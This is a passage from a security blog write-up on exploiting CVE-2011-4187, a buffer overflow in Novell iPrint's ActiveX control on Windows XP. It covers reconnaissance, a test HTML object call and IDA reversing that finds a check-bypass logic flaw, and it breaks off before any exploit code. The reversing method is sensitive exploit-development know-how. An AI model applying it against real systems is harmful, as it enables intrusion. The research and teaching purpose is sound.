<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Write-up: ActiveX controller exploitation - Ech0 Security Blog</title><meta name="Description" content="Security blog"><meta property="og:url" content="https://ech0.re/posts/active-x-exploitation/">
  <meta property="og:site_name" content="Ech0 Security Blog">
  <meta property="og:title" content="Write-up: ActiveX controller exploitation">
  <meta property="og:description" content="1. Introduction Warning This post is intended for intermediate or experienced people, as I will not explain the basics of reverse engineering or exploitation. This is probably the longest write-up youâ€™ll see on this blog. The reason is simple: I will show you the whole processus of vulnerability research, to full exploitation of a Windows OCX Controller, including failing paths (that are very interesting).
I will go from a simple CVE number, with no existing public exploit and not much information on the internet, to finding the vulnerability and exploiting it to run arbitrary code on the operating system.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-05-29T03:22:29+02:00">
    <meta property="article:modified_time" content="2022-05-29T03:22:29+02:00">
    <meta property="article:tag" content="Windows">
    <meta property="article:tag" content="Exploit">
    <meta property="article:tag" content="Write-Up">
    <meta property="article:tag" content="Cve">
<meta name="twitter:card" content="summary"><meta name="twitter:title" content="Write-up: ActiveX controller exploitation">
<meta name="twitter:description" content="1. Introduction Warning This post is intended for intermediate or experienced people, as I will not explain the basics of reverse engineering or exploitation. This is probably the longest write-up you&rsquo;ll see on this blog. The reason is simple: I will show you the whole processus of vulnerability research, to full exploitation of a Windows OCX Controller, including failing paths (that are very interesting).
I will go from a simple CVE number, with no existing public exploit and not much information on the internet, to finding the vulnerability and exploiting it to run arbitrary code on the operating system.">
      <meta name="twitter:site" content="@ech0fr">
<meta name="application-name" content="Ech0.re">
<meta name="apple-mobile-web-app-title" content="Ech0.re"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://ech0.re/posts/active-x-exploitation/" /><link rel="prev" href="https://ech0.re/posts/how-to-start/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Write-up: ActiveX controller exploitation",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/ech0.re\/posts\/active-x-exploitation\/"
        },"genre": "posts","keywords": "windows, exploit, write-up, cve","wordcount":  6239 ,
        "url": "https:\/\/ech0.re\/posts\/active-x-exploitation\/","datePublished": "2022-05-29T03:22:29+02:00","dateModified": "2022-05-29T03:22:29+02:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Ech0"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Ech0 Security Blog">Ech0.re</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Ech0 Security Blog">Ech0.re</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content always-active" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Write-up: ActiveX controller exploitation</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://ech0.re" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Ech0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-05-29">2022-05-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6239 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;30 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#1-introduction">1. Introduction</a></li>
    <li><a href="#2-gathering-information">2. Gathering information</a>
      <ul>
        <li><a href="#21-about-the-cve">2.1. About the CVE</a></li>
        <li><a href="#22-about-the-target">2.2. About the target</a></li>
      </ul>
    </li>
    <li><a href="#3-reversing-the-controller">3. Reversing the controller</a>
      <ul>
        <li><a href="#31-reversing-ienippocx">3.1 Reversing ienipp.ocx</a></li>
        <li><a href="#32-reversing-nipplibdll">3.2. Reversing nipplib.dll</a></li>
      </ul>
    </li>
    <li><a href="#4-exploitation">4. Exploitation</a>
      <ul>
        <li><a href="#41-control-eip">4.1. Control EIP</a></li>
        <li><a href="#42-get-a-shellcode">4.2. Get a shellcode</a></li>
        <li><a href="#43-store-the-shellcode-in-memory">4.3. Store the shellcode in memory</a></li>
        <li><a href="#44-get-the-shellcodes-address">4.4. Get the shellcode&rsquo;s address</a></li>
        <li><a href="#45-jump-to-shellcode-and-win">4.5. Jump to shellcode and win</a></li>
      </ul>
    </li>
    <li><a href="#5-other-paths">5. Other paths</a>
      <ul>
        <li><a href="#51-the-ipp-server">5.1. The IPP Server</a></li>
        <li><a href="#52-the-ciphertext-buffer-overflow">5.2. The ciphertext buffer overflow</a></li>
      </ul>
    </li>
    <li><a href="#6-conclusion">6. Conclusion</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="1-introduction">1. Introduction</h2>
<div class="details admonition warning open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Warning<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">This post is intended for <strong>intermediate</strong> or <strong>experienced</strong> people, as <strong>I will not explain the basics</strong> of reverse engineering or exploitation.</div>
        </div>
    </div>
<p>This is probably the longest write-up you&rsquo;ll see on this blog. The reason is simple: I will show you the <strong>whole processus</strong> of vulnerability research, to full exploitation of a <strong>Windows OCX Controller</strong>, including failing paths (that are very interesting).</p>
<p>I will go from a <strong>simple CVE number</strong>, with <strong>no existing public exploit</strong> and not much information on the internet, to <strong>finding the vulnerability and exploiting it</strong> to run <strong>arbitrary code</strong> on the operating system.</p>
<p>The goal here is to show you <strong>all the thinking process</strong>, all the techniques I&rsquo;ve used to get unstuck of some situations, and so on. That&rsquo;s why I have included <strong>even the paths that lead to failure</strong>, because it&rsquo;s <strong>part of the process</strong>.</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>This write-up will first show the <strong>correct way of exploitation leading to success</strong>, and then <strong>at the end</strong> I will include the paths that first lead me to the <strong>wrong directions</strong>.</p>
<p><strong>Do not neglect these failing paths, there are a huge part of the vulnerability research and exploitation process, and I&rsquo;d say they are even more important that the success path.</strong></p>
</div>
        </div>
    </div>
<p>Let&rsquo;s start this journey, with the only starting element we have: <strong>CVE-2011-4187</strong>.</p>
<h2 id="2-gathering-information">2. Gathering information</h2>
<p>I will not spend a lot of time on this gathering information chapter, because this post will already be long enough. You will still get the <strong>right idea</strong> though.</p>
<p>We have nothing, no exploit, not even a clear indication of the vulnerability, but only a <strong>CVE number</strong>.</p>
<p>The first tool we need is <strong>Google</strong>!</p>
<h3 id="21-about-the-cve">2.1. About the CVE</h3>
<p>We notice that there is <strong>no public exploit</strong> associated with this CVE but we quickly get to the cvedetails page: <a href="https://www.cvedetails.com/cve/CVE-2011-4187/" target="_blank" rel="noopener noreffer ">https://www.cvedetails.com/cve/CVE-2011-4187/</a> on which we can read:</p>
<blockquote>
<p><strong>Buffer overflow</strong> in the <strong>GetDriverSettings</strong> function in <strong>nipplib.dll</strong> in Novell iPrint Client before 5.78 on Windows allows remote attackers to execute arbitrary code via a <strong>long realm field</strong>, a different vulnerability than CVE-2011-3173.</p>
</blockquote>
<p>So, <strong>GetDriverSettings</strong>, <strong>nipplib.dll</strong>, <strong>Buffer overflow</strong> and <strong>realm field</strong> are the keywords of this vulnerability.</p>
<p>By googling about <strong>nipplib.dll</strong>, we find more posts and pages about some <strong>ActiveX</strong> vulnerable component.</p>
<p>There is also a Windows client tool and its version mentionned, by trying to install it on our Windows 7 system we notice it fails: indeed, <strong>it only works on Windows XP</strong>. So we assume the whole exploitation part will have to be done on Windows XP, <strong>which makes things a bit harder</strong>.</p>
<h3 id="22-about-the-target">2.2. About the target</h3>
<p>So we start a <strong>Windows XP SP3</strong> virtual machine through Virtual Box and run the installation process of the client.</p>
<p>At this point we know it has something to do with an <strong>ActiveX controller</strong>, so we&rsquo;ll simply try and call some of its methods.</p>
<p>In order to call this controller, we need its object ID (<strong>CLSID</strong>). We know that the name of the program is <strong>Novell iPrint</strong> so we&rsquo;ll search for this name in the windows registry to get the CLSID.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/registry_window.png"
        data-srcset="/activex/registry_window.png, /activex/registry_window.png 1.5x, /activex/registry_window.png 2x"
        data-sizes="auto"
        alt="/activex/registry_window.png"
        title="Screenshot Registry Editor" /></p>
<div class="details admonition success open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-check-circle fa-fw" aria-hidden="true"></i>Success<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">The CLSID is <strong>36723F97-7AA0-11D4-8919-FF2D71D0D32C</strong>.</div>
        </div>
    </div>
<p>We can reference this controller by specifying its <strong>object ID in an HTML object tag</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">object</span> <span class="na">classid</span><span class="o">=</span><span class="s">&#39;clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C&#39;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;target&#39;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">object</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Next, we&rsquo;ll use <strong>Javascript</strong> to call its methods.</p>
<div class="details admonition question open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>How did I know how to reference this object?<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>In another exploit published on <strong>exploit-db</strong>, we can notice that the same vulnerable function <strong>GetDriverSettings</strong> is used: <a href="https://www.exploit-db.com/exploits/16014" target="_blank" rel="noopener noreffer ">https://www.exploit-db.com/exploits/16014</a>. Since I didn&rsquo;t know how to correctly call this ActiveX controller, I <strong>used this exploit to format my object call</strong> and verify the CLSID I found.</p>
<p>Even though this is <strong>not our vulnerability</strong>, it still helps to look at how other people managed to reach a certain point in their exploitation process. Here, we used their way to <strong>reference the ActiveX object</strong>.</p>
</div>
        </div>
    </div>
<p>We must have an <strong>.OCX</strong> binary object and a <strong>.DLL</strong> library installed through the installation process. We&rsquo;ll use the <strong>.OCX</strong> file to read our ActiveX controller&rsquo;s <strong>methods</strong>.</p>
<div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Info<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Again, this information is quickly found by <strong>Googling</strong> about ActiveX. I will not cover the Google search part in this post. If there are some things I don&rsquo;t explain and you wonder &ldquo;how did he find this information&rdquo;, the answer is always: simple Google search. If it&rsquo;s not that simple, I&rsquo;ll cover it in this post.</div>
        </div>
    </div>
<p>If we list <strong>all installed .OCX files on the system</strong>, particulary one of them is interesting: <strong>ienipp.ocx</strong> which was <strong>part of the ActiveX control name in the registry</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">cd</span> C:\Windows\system32
</span></span><span class="line"><span class="cl"><span class="k">dir</span> *.ocx
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/list_ocx_files.png"
        data-srcset="/activex/list_ocx_files.png, /activex/list_ocx_files.png 1.5x, /activex/list_ocx_files.png 2x"
        data-sizes="auto"
        alt="/activex/list_ocx_files.png"
        title="List OCX Files" /></p>
<p>We&rsquo;ll use <strong>OLE/COM Object Viewer</strong> from the <a href="https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/" target="_blank" rel="noopener noreffer "><strong>Windows 10 SDK tools</strong></a> to browse this <strong>ienipp.ocx</strong> file.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/browsing_ocx_file.png"
        data-srcset="/activex/browsing_ocx_file.png, /activex/browsing_ocx_file.png 1.5x, /activex/browsing_ocx_file.png 2x"
        data-sizes="auto"
        alt="/activex/browsing_ocx_file.png"
        title="Browsing OCX File" /></p>
<p>Among the listed methods, we find <strong>GetDriverSettings</strong> which seems to be our vulnerable function (according to the cvedetails page). Also, <strong>GetDriverSettings2</strong> is listed, probably a <strong>sub-method</strong> or a <strong>second version</strong>.</p>
<p>We can use <strong>ShowMessageBox</strong> method to quickly test our ActiveX controller.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/msgbox_method.png"
        data-srcset="/activex/msgbox_method.png, /activex/msgbox_method.png 1.5x, /activex/msgbox_method.png 2x"
        data-sizes="auto"
        alt="/activex/msgbox_method.png"
        title="MsgBox Method" /></p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>At this point, before continuing, I wanted to make a <strong>simple test</strong> to make sure I&rsquo;m on the <strong>right path</strong>.</p>
<p>Basically, I wanted to confirm that my way of calling this object method&rsquo;s was correct and working, and that the <strong>CLSID</strong> we found was the right one.</p>
<p>Every time you have a <strong>simple way</strong> to probe and test that you&rsquo;re on the right path, you should do it to avoid taking unnecessary time looking at wrong elements.</p>
<p>Here, I called a <strong>simple message box function</strong>.</p>
</div>
        </div>
    </div>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">object</span> <span class="na">classid</span><span class="o">=</span><span class="s">&#39;clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C&#39;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;target&#39;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">object</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">target</span><span class="p">.</span><span class="nx">ShowMessageBox</span><span class="p">(</span><span class="s2">&#34;HelloWorld&#34;</span><span class="p">,</span> <span class="s2">&#34;Title&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>We test our method call by opening the HTML file in <strong>Internet Explorer</strong> (because other browsers will not use ActiveX controller drivers).</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/msgbox_call.png"
        data-srcset="/activex/msgbox_call.png, /activex/msgbox_call.png 1.5x, /activex/msgbox_call.png 2x"
        data-sizes="auto"
        alt="/activex/msgbox_call.png"
        title="MsgBox Call" /></p>
<div class="details admonition success open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-check-circle fa-fw" aria-hidden="true"></i>Success<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Our method was correctly called. We are now sure that we are <strong>dealing with the right object ID</strong> and that we&rsquo;re <strong>able to call its methods</strong>.</div>
        </div>
    </div>
<p>We can even try to call <strong>GetDriverSettings</strong> to see what happens.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/getdriversettings.png"
        data-srcset="/activex/getdriversettings.png, /activex/getdriversettings.png 1.5x, /activex/getdriversettings.png 2x"
        data-sizes="auto"
        alt="/activex/getdriversettings.png"
        title="GetDriverSettings" /></p>
<p>But as expected, nothing visual happens.</p>
<p>Now that all <strong>basic tests</strong> are done and we got a <strong>global view of the scope</strong>, we can
start <strong>reversing ienipp.ocx</strong> to see how a call to <strong>GetDriverSettings</strong> is handled.</p>
<h2 id="3-reversing-the-controller">3. Reversing the controller</h2>
<p>I will mostly use <strong>IDA Pro 32-bit</strong> for reversing the binaries.</p>
<h3 id="31-reversing-ienippocx">3.1 Reversing ienipp.ocx</h3>
<p>Let&rsquo;s open <strong>ienipp.ocx</strong> in IDA and find the <strong>GetDriverSettings</strong> function. IDA asks for an input file <strong>nipplib.dll</strong>, also we read that the vulnerable function is called from this DLL. So we take this .DLL file and from <strong>C:\Windows\system32\</strong> and give it to IDA.</p>
<p>While searching the <em>GetDriverSettings</em> keyword among IDA imported functions, we get to this:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/get_driver_settings_handler.png"
        data-srcset="/activex/get_driver_settings_handler.png, /activex/get_driver_settings_handler.png 1.5x, /activex/get_driver_settings_handler.png 2x"
        data-sizes="auto"
        alt="/activex/get_driver_settings_handler.png"
        title="GetDriverSettings Wrapper" /></p>
<p>A function called from the <strong>nipplib.dll</strong> library. Let&rsquo;s find its references to check where and when it is called:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/xref1.png"
        data-srcset="/activex/xref1.png, /activex/xref1.png 1.5x, /activex/xref1.png 2x"
        data-sizes="auto"
        alt="/activex/xref1.png"
        title="GetDriverSettings Cross References" /></p>
<p>The function is called only at address <strong>0x1000AE10+244</strong>, if we look at the code we notice that many things are being checked <strong>before calling the vulnerable function</strong> (marked in red as breakpoint).</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/cftovuln.png"
        data-srcset="/activex/cftovuln.png, /activex/cftovuln.png 1.5x, /activex/cftovuln.png 2x"
        data-sizes="auto"
        alt="/activex/cftovuln.png"
        title="Control flow to vulnerable function" /></p>
<p>We can notice strings like <strong>ipp://%s/ipp/IppSrvr</strong> are being used among the checks. If we assume that <strong>%s</strong> will be replaced with a printer URL (which is one of the <strong>GetDriverSettings</strong> method&rsquo;s parameter), a quick guess is that we&rsquo;ll need to setup a server to correctly reply to this client&rsquo;s requests in order to pass the checks.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/ippchecks.png"
        data-srcset="/activex/ippchecks.png, /activex/ippchecks.png 1.5x, /activex/ippchecks.png 2x"
        data-sizes="auto"
        alt="/activex/ippchecks.png"
        title="IPP checks" /></p>
<p>In other terms, some work is needed <strong>before even calling the vulnerable code</strong>.</p>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">In this write-up, I&rsquo;ll not explain each and every instruction bloc that I reversed, but I&rsquo;ll directly come to the important branches and sum-up what is happening step-by-step.</div>
        </div>
    </div>
<p><strong>First</strong>, some checks are done on our method&rsquo;s parameters (<strong>printerUri</strong>, <strong>realm</strong>, <strong>userName</strong>, <strong>password</strong>) at the very beginning:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/method_param_check.png"
        data-srcset="/activex/method_param_check.png, /activex/method_param_check.png 1.5x, /activex/method_param_check.png 2x"
        data-sizes="auto"
        alt="/activex/method_param_check.png"
        title="Method param checks" /></p>
<p>Basically, the length of each parameter is being checked, so if we stay at less that <strong>0x100 bytes</strong>, we pass the checks (otherwise <strong>IppGetDriverSettings2</strong> is not called).</p>
<p><strong>Then</strong>, we get to the main bloc of these check series:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/main_checks.png"
        data-srcset="/activex/main_checks.png, /activex/main_checks.png 1.5x, /activex/main_checks.png 2x"
        data-sizes="auto"
        alt="/activex/main_checks.png"
        title="Main checks" /></p>
<p>The line marked in red (breakpoint) is a <strong>key function call</strong> because it will determine the next jump: if the <strong>sub_1000FBD0</strong> function returns a value different from 0, <strong>the vulnerable call isn&rsquo;t done</strong> and we directly jump to the end. Else, if another length check is passed, <strong>the vulnerable function is called anyway</strong>, that makes this <strong>sub_1000FBD0</strong> function a really important check.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/important_check.png"
        data-srcset="/activex/important_check.png, /activex/important_check.png 1.5x, /activex/important_check.png 2x"
        data-sizes="auto"
        alt="/activex/important_check.png"
        title="Important check" /></p>
<p>Let&rsquo;s rename this function to <em>important_check</em> for more simplicity. Now, we&rsquo;ll reverse it.</p>
<p>Surprisingly, the function body is quite simple, and it itself calls another <strong>nipplib.dll</strong> function called <strong>IppMgmtGetServerVersion2</strong> which is again a key call because it will determine whereas the <strong>important_check</strong> function returns 0 or not.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/important_check_2.png"
        data-srcset="/activex/important_check_2.png, /activex/important_check_2.png 1.5x, /activex/important_check_2.png 2x"
        data-sizes="auto"
        alt="/activex/important_check_2.png"
        title="Important check" /></p>
<p>From now on, we&rsquo;re done with <strong>ienipp.ocx</strong> because we need to reverse the <strong>IppMgmtGetServerVersion2</strong> declared in the <strong>nipplib.dll</strong> library.</p>
<div class="details admonition abstract open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-list-ul fa-fw" aria-hidden="true"></i>What to keep in mind<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>We learned two important things from this .OCX file:</p>
<ul>
<li>Our method parameters must have a small enough length.</li>
<li><strong>IppMgmtGetServerVersion2</strong> must succeed (return 0) so that <strong>important_check</strong> also returns 0 and <strong>leads to the vulnerable call</strong>.</li>
</ul>
<p>With these two conditions respected, <strong>the vulnerable function will be called</strong>.</p>
</div>
        </div>
    </div>
<h3 id="32-reversing-nipplibdll">3.2. Reversing nipplib.dll</h3>
<p>Just like the .OCX file, let&rsquo;s open <strong>nipplib.dll</strong> library in IDA. We could reverse the <strong>IppGetDriverSettings2</strong> function but for now, we&rsquo;re interested in <strong>IppMgmtGetServerVersion2</strong> according to the previous analysis. We want to make sure we reach the vulnerable call, before analysing it.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/get_server_version.png"
        data-srcset="/activex/get_server_version.png, /activex/get_server_version.png 1.5x, /activex/get_server_version.png 2x"
        data-sizes="auto"
        alt="/activex/get_server_version.png"
        title="Get Server Version" /></p>
<p>As we can see, it simply calls a sub function <strong>sub_5C04B514</strong>, which is more interesting:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/sub_5C04B514.png"
        data-srcset="/activex/sub_5C04B514.png, /activex/sub_5C04B514.png 1.5x, /activex/sub_5C04B514.png 2x"
        data-sizes="auto"
        alt="/activex/sub_5C04B514.png"
        title="sub_5C04B514" /></p>
<p>A lot of things seems to happen there, and there&rsquo;s probably where the <strong>IPP requests</strong> are being made. The first idea that comes is &ldquo;we need a server to reply to these requests&rdquo;.</p>
<p><strong>But</strong>, if we step back and consider each bloc as a mathematical equation and completely forget how it should work, <strong>some interesting paths shows up</strong>.</p>
<p>The problem is simple: <strong>if the function fails</strong> (so, basically if it cannot correctly get the server version), <strong>it will return -1</strong>, and <strong>we need it to return 0</strong> in order to pass our checks in the .OCX file.</p>
<p>Let&rsquo;s take each and every jump of this function and <strong>look which one of them leads to a return 0 bloc</strong>.</p>
<p>This is the first jump:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/first_jump.png"
        data-srcset="/activex/first_jump.png, /activex/first_jump.png 1.5x, /activex/first_jump.png 2x"
        data-sizes="auto"
        alt="/activex/first_jump.png"
        title="first_jump" /></p>
<p>Indeed, depending the condition, <strong>one of the two paths leads to a return 0</strong> result. I mean, directly, with no other checks or anything else:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/return0bloc.png"
        data-srcset="/activex/return0bloc.png, /activex/return0bloc.png 1.5x, /activex/return0bloc.png 2x"
        data-sizes="auto"
        alt="/activex/return0bloc.png"
        title="return0bloc" /></p>
<p>The condition is weird. <strong>If IppCreateServerRef fails</strong> (returns NULL), <strong>the whole IppMgmtGetServerVersion2 function bloc returns 0</strong> (success). This looks like some logic programming bug.</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Important point<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">So this idea came into my mind: what if we could simply <strong>make IppCreateServerRef fail</strong>, we could <strong>bypass all these other tests based on IPP servers</strong> and we would not even need to reverse it all or emulate a server.</div>
        </div>
    </div>
<p>As I said, if we forget how it is <strong>supposed to work</strong> and simply consider the control flow graph as it is, we realize that <strong>this condition leading to a return 0 bloc exists</strong> and that we can exploit it. We basically found a loophole in the whole checking process.</p>
<p>Now let&rsquo;s reverse <strong>IppCreateServerRef</strong>. We need to make it fail.</p>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Everytime I needed to verify what a function exactly takes as argument or how the program behaves on a specific return, I ran <strong>x64dbg</strong> on Windows XP, put a breakpoint on that function call and checked the stack. I will not specify this every time but I&rsquo;ll show one example here.</div>
        </div>
    </div>
<p>Let&rsquo;s place a breakpoint on <strong>IppCreateServerRef</strong> function call to quickly know what parameters are being checked there.</p>
<p>We&rsquo;ll use <strong>x64dbg</strong> on Windows XP, run Internet Explorer (<strong>iexplorer.exe</strong>) with a basic payload and <strong>attach to the process</strong>.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/activex/debug_example_bp.png"
        data-srcset="/activex/debug_example_bp.png, /activex/debug_example_bp.png 1.5x, /activex/debug_example_bp.png 2x"
        data-sizes="auto"
        alt="/activex/debug_example_bp.png"
        title="Debug example bp" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
